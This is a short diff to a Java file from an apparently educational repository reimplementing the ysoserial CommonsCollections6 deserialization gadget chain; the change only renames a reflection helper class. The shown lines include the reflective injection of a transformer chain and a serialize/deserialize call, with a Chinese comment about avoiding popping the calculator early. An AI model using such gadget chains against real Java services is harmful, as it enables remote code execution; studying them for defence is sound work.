@@ -1,6 +1,6 @@
 package com.xjjlearning.hack.java.ysoserial.payloads;
 
-import com.xjjlearning.hack.java.ysoserial.payloads.util.Reflections;
+import com.xjjlearning.hack.java.ysoserial.payloads.util.ReflectionUtil;
 import com.xjjlearning.hack.java.ysoserial.payloads.util.SerializationUtil;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
@@ -47,7 +47,7 @@ public class CommonCollections6 {
         outerMap.remove("key");
 
         // 变量替换 防止上边obj.put()方法弹出计算器
-        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
+        ReflectionUtil.setFieldValue(transformerChain, "iTransformers", transformers);
 
         Optional<byte[]> b = SerializationUtil.serialize(obj);
         SerializationUtil.deserialize(b);
